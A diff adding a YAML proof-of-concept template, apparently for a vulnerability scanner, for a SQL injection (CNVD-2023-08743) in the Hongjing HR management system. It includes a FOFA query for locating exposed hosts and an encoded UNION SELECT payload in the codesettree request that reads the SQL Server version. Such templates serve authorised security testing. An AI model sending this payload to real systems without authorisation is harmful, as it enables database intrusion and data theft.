@@ -1,0 +1,24 @@
+id: poc-yaml-hongjing-sql-injection-cnvd-2023-08743
+info:
+  name: 宏景人力资源管理系统 - SQL注入漏洞(CNVD-2023-08743)
+  severity: critical
+  tags:
+  - 两高一弱
+  - sql-injection
+  - CNVD-2023-08743
+  finger: 宏景人力资源管理系统
+  fofa: title="人力资源信息管理系统"
+requests:
+- method: GET
+  path: /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d
+  expression: 'status_code == 200 &&
+
+    contains(content_type,"text/xml") &&
+
+    contains(body,"TreeNode id=\"hongjing") &&
+
+    contains(body,"SQL Server")
+
+    '
+variables: {}
+transport: http
